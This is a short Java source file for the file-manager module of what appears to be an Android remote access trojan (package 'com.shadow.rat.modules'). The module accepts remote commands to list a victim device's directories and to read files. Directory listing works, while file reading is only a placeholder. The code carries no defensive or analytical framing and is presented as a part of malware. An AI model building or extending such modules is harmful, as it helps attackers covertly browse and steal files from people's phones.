package com.shadow.rat.modules;

import android.content.Context;
import java.io.File;

public class FileManager implements Module {

    private final Context context;

    public FileManager(Context context) {
        this.context = context;
    }

    @Override
    public String execute(String command) {
        if (command.startsWith("ls")) {
            return listFiles(command.substring(3));
        } else if (command.startsWith("cat")) {
            return readFile(command.substring(4));
        }
        return "Unknown command for FileManager. Available commands: ls <path>, cat <path>";
    }

    private String listFiles(String path) {
        File file = new File(path);
        if (file.exists() && file.isDirectory()) {
            StringBuilder sb = new StringBuilder();
            for (File f : file.listFiles()) {
                sb.append(f.getName()).append("\n");
            }
            return sb.toString();
        }
        return "Invalid path.";
    }

    private String readFile(String path) {
        // Read file logic
        return "Reading file: " + path;
    }
}
